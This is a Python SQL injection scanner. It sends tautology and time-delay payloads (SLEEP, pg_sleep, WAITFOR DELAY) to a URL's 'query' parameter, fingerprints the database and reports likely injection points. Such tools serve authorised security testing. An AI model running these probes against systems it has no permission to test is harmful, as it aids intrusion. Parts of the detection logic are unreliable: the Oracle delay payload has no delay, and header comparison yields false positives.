import requests
import time
import urllib.parse

# SQL Injection Payloads
DB_FINGERPRINT_PAYLOADS = {
    "MySQL": "' OR 1=1 --",
    "PostgreSQL": "' OR 1=1; --",
    "SQLite": "' OR 1=1 --",
    "MSSQL": "' OR 1=1; --",
    "Oracle": "' OR 1=1 --"
}

TIME_DELAY_PAYLOADS = {
    "MySQL": "' OR SLEEP(5) --",
    "PostgreSQL": "'; SELECT pg_sleep(5); --",
    "MSSQL": "' OR WAITFOR DELAY '00:00:05' --",
    "Oracle": "' OR 1=1 --"
}

ERROR_KEYWORDS = {
    "MySQL": ["mysql", "MariaDB", "syntax error"],
    "PostgreSQL": ["postgresql", "pg_", "syntax error"],
    "SQLite": ["sqlite", "SQLITE_ERROR"],
    "MSSQL": ["microsoft sql", "mssql", "Unclosed quotation mark"],
    "Oracle": ["oracle", "ora-", "missing expression"]
}

SQLI_TEST_PAYLOADS = [
    "'", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"
]

def fingerprint_database(url):
    """Attempts to identify the database by testing for SQL errors and time delays."""
    detected_db = "Unknown"

    # Step 1: Check for error-based fingerprinting
    for db, payload in DB_FINGERPRINT_PAYLOADS.items():
        encoded_payload = urllib.parse.quote(payload)  # URL encode the payload
        test_url = f"{url}?query={encoded_payload}"  # Ensure correct parameter is used
        try:
            response = requests.get(test_url, timeout=10)
            for keyword in ERROR_KEYWORDS[db]:
                if keyword.lower() in response.text.lower():
                    detected_db = db
                    break
            if detected_db != "Unknown":
                return detected_db  # Stop if database is identified
        except requests.exceptions.RequestException:
            continue  # Skip if request fails

    # Step 2: Check for time-based SQL Injection
    for db, payload in TIME_DELAY_PAYLOADS.items():
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?query={encoded_payload}"
        try:
            start_time = time.time()
            requests.get(test_url, timeout=15)
            elapsed_time = time.time() - start_time

            if elapsed_time > 4.5:  # If the response is delayed, SQLi is likely present
                return db
        except requests.exceptions.RequestException:
            continue

    return detected_db

def detect_sqli(url):
    """Tests for SQL Injection by checking response content, length, headers, and time delays."""
    results = []
    
    # Step 1: Perform a baseline request
    try:
        normal_response = requests.get(url, timeout=10)
        normal_text = normal_response.text.lower()
        normal_length = len(normal_response.text)
        normal_headers = normal_response.headers  # Capture headers
    except requests.exceptions.RequestException as e:
        return [f"[!] Error connecting to target: {str(e)}"]

    # Step 2: Test for content-based SQL Injection
    for payload in SQLI_TEST_PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?query={encoded_payload}"
        try:
            response = requests.get(test_url, timeout=10)
            test_text = response.text.lower()
            test_length = len(response.text)
            test_headers = response.headers  # Capture headers

            # Check if the response contains differences (i.e., a different search result)
            if test_text != normal_text or test_length != normal_length or test_headers != normal_headers:
                results.append(f"[!] Possible SQL Injection detected with payload: {payload}")
        except requests.exceptions.RequestException:
            continue

    # Step 3: Test for time-based SQL Injection
    db_type = fingerprint_database(url)
    if db_type != "Unknown":
        payload = TIME_DELAY_PAYLOADS[db_type]
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?query={encoded_payload}"
        try:
            start_time = time.time()
            requests.get(test_url, timeout=15)
            elapsed_time = time.time() - start_time

            if elapsed_time > 4.5:
                results.append(f"[!] Time-based SQL Injection detected using {db_type}.")
        except requests.exceptions.RequestException as e:
            results.append(f"[!] SQLi time-based test failed: {str(e)}")

    # If no SQLi was detected, return safe result
    if not results:
        results.append("[+] No SQL Injection detected.")

    return results